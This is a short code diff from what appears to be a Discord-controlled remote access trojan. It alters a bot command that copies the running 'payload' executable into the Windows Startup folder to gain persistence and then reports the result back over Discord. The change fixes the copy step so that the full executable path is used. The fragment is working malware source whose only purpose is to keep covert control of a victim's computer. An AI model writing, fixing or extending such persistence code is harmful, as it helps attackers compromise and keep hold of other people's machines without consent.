@@ -118,8 +118,7 @@ async def startup(ctx):
     await ctx.send(embed = discord.Embed(title = "Current Directory: \n" + os.getcwd(), color = 0x0081FA))
     os.chdir(ogdir)
     await ctx.send(embed = discord.Embed(title = "Trying to copy payload into startup directory...", color = 0x0081FA))
-    modded_startup = os.path.basename(executable)
-    os.system('copy "' + modded_startup + '" "' + os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" + '"')
+    os.popen('copy "' + executable + '" "' + os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" + '"')
     os.chdir(os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
     await ctx.send(embed = discord.Embed(title = "If you see the program here, you're good to go: ", color = 0x0081FA))
     for value in os.listdir(): msg += f'{value}\n'
